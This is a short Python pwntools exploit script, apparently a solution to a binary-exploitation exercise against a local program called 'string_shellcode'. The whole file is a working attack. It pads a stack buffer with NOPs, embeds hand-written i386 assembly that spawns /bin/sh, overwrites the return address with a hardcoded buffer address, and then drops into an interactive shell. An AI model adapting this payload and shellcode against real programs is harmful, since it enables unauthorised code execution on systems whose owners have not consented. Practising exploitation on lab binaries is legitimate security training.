#!/usr/bin/env python

from pwn import *

io = process("./string_shellcode")

# Determine g_buffer address using
#    nm string_shellcode | grep ' g_buffer'
g_buffer_address = 0x0804a060

# Determine l_buffer_offset using GDB PEDA.
l_buffer_offset = 32

# Craft payload.
# shellcode = asm(shellcraft.i386.linux.sh())

# In case shellcode is too large (for some versions of pwntool) use
# the one below; uncomment the lines.
shellcode = asm("""
xor eax,eax
cdq
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
push eax
push ebx
mov ecx, esp
mov al,0x0b
int 0x80
""" )
print len(shellcode)
payload = '\x90' * (l_buffer_offset - len(shellcode))# TODO
payload += shellcode
payload += p32(g_buffer_address)

# Send payload and the use shell.
io.sendline(payload)
io.interactive()
